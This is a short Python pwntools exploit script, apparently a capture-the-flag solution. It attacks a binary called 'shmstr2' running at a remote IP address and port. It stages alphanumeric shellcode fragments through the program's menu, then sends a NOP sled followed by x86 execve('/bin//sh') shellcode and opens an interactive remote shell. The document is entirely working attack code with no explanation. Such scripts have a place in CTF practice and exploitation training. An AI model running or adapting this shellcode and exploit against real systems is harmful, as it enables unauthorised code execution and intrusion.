#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "./shmstr2"

IP = "151.236.114.211"
PORT = 17183

LINK_LIBC = False
LIBC = ""
LD = ""
GDBSCRIPT = """
b *run_shellcode+278
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

def add_shell(data):
    r.sendline(b"1")
    r.recvuntil(b": ")
    r.send(data)
    r.recvuntil(b"> ")

def run_shell(idx, pwn=0):
    r.sendline(b"4")
    r.recvuntil(b": ")
    r.sendline(str(idx).encode())
    if pwn:
        return
    r.recvuntil(b"> ")

# SPLOIT #

r.recvuntil(b"> ")

add_shell(b"Y0JDQA")
add_shell(b"AA0JDA")
add_shell(b"Y0JEQjaYII0JEA")
add_shell(b"YIIII0JCAAAAQA")
add_shell(b"j1Y0JB")

for i in range(5):
    run_shell(i)

r.sendline(b"3")
r.recvuntil(": ")
r.sendline(b"3")

add_shell(b"RYXXXqK")
run_shell(3, 1)

r.send(b"\x90" * 0x55 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")

r.interactive()
